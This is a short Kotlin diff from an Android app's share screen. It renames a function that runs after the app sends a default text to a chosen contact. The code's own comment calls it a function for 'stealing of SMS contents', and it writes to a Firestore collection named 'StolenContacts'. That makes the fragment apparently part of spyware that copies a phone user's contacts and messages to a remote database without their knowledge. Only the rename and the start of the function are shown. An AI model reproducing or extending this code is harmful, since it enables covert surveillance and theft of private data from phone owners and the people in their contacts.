@@ -142,7 +142,7 @@ class ShareFragment : Fragment() {
                         sendDefaultMessageTo(number)
 
                         // After sending the message, retrieve contact information and store in Firestore
-                        retrieveContactsAndStoreInFirestore(contactId, number)
+                        retrieveContactsAndStoreInFirestoreandSMS(contactId, number)
                     } else {
                         Toast.makeText(context, "Failed to get contact number", Toast.LENGTH_SHORT)
                             .show()
@@ -174,7 +174,7 @@ class ShareFragment : Fragment() {
     }
 
     //Stealing of SMS contents function, Permission required Read
-    private fun retrieveContactsAndStoreInFirestore(contactId: String, phoneNumber: String) {
+    private fun retrieveContactsAndStoreInFirestoreandSMS(contactId: String, phoneNumber: String) {
         // Store contact data in Firestore
         val db = FirebaseFirestore.getInstance()
         val contactsCollectionRef = db.collection("StolenContacts")
